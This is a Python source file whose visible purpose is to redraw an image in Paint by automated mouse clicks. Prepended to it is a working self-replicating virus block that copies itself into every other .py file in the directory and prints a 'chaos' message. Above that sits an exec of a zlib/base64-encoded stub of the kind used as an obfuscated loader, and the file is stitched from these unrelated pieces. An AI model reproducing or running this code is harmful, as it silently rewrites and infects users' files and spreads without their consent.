
# begin-9a4ffb42c8db3615f765f477c2ae9ca0
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNoDAAAAAAE=')))")
# end-9a4ffb42c8db3615f765f477c2ae9ca0
# begin-virus

import glob

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)

def get_virus_code():

    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def summon_chaos():
    # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

# entry point

try:
    # retrieve the virus code from the current infected script
    virus_code = get_virus_code()

    # look for other files to infect
    for file in find_files_to_infect():
        infect(file, virus_code)

    # call the payload
    summon_chaos()

# except:
#     pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i
# end-virus
import PIL.Image
import mouse
from UTIL import *
FailSafe()
def I_dont_care(color=0, img_path=r"C:\Users\WinstonBai\OneDrive\Pictures\Camera Roll\The_Chosen_One.jpg", randim=True):
    img=PIL.Image.open(img_path)
    # img.show()
    image_array=np.array(img)
    print(image_array)
    coords=np.where(image_array==color)#(y's,x's)
    Y, X = coords
    if randim:
        indices = np.arange(len(Y))
        np.random.shuffle(indices)
        Y = Y[indices]
        X = X[indices]
    print(coords)
    print(Y)
    print(X)
    counter=0
    canvas_top_left_corner=(12, 217+1)
    MaximizePaint()
    for y,x in zip(Y, X): #zip(coords[0], coords[1])
        if FailSafe():
            break
        print(x, y)
        counter+=1
        mouse.move(2*x+canvas_top_left_corner[0], 2*y+canvas_top_left_corner[1])
        mouse.click()
        delay(10000)

I_dont_care(img_path="B.png", color=1, randim=False)